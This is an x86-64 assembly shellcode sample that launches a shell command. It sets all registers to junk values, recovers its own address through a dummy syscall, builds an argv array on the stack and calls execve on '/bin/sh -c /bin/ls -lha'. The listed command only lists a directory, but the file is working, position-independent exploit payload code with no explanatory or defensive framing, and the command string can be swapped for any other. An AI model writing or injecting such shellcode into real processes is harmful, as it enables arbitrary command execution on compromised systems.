global _start
section .text

_start:
  mov rax, 0xdeadbeefcafebabe
  mov rbx, 0xdeadbeefcafebabe
  mov rcx, 0xdeadbeefcafebabe
  mov rdx, 0xdeadbeefcafebabe
  mov rsi, 0xdeadbeefcafebabe
  mov rdi, 0xdeadbeefcafebabe
  mov rbp, 0xdeadbeefcafebabe
  mov r8, 0xdeadbeefcafebabe
  mov r9, 0xdeadbeefcafebabe
  mov r10, 0xdeadbeefcafebabe
  mov r11, 0xdeadbeefcafebabe
  mov r12, 0xdeadbeefcafebabe
  mov r13, 0xdeadbeefcafebabe
  mov r14, 0xdeadbeefcafebabe
  mov r15, 0xdeadbeefcafebabe

  ; rax=0
  push rax
  xor rax, [rsp]
  ; rsi=0
  push rax
  pop rsi
  ; rcx=shellcode+delta
  syscall
  @retaddr:
  ; rdx=0; push 0
  push rdx
  xor rdx, [rsp]
  push rdx
  ; push arg2
  push rcx
  pop rax
  add al, @arg2 - @retaddr
  push rax
  ; push arg1
  push rcx
  pop rax
  add al, @arg1 - @retaddr
  push rax
  ; push arg0
  push rcx
  pop rax
  add al, @arg0 - @retaddr
  push rax
  ; rdi=arg0
  push rax
  pop rdi
  ; rsi=rsp
  push rsp
  pop rsi
  ; rax=59
  push rdx
  pop rax
  add al, 59
  ; syscall
  syscall

  @arg0:
  db "/bin/sh", 0
  @arg1:
  db "-c", 0
  @arg2:
  db "/bin/ls -lha", 0
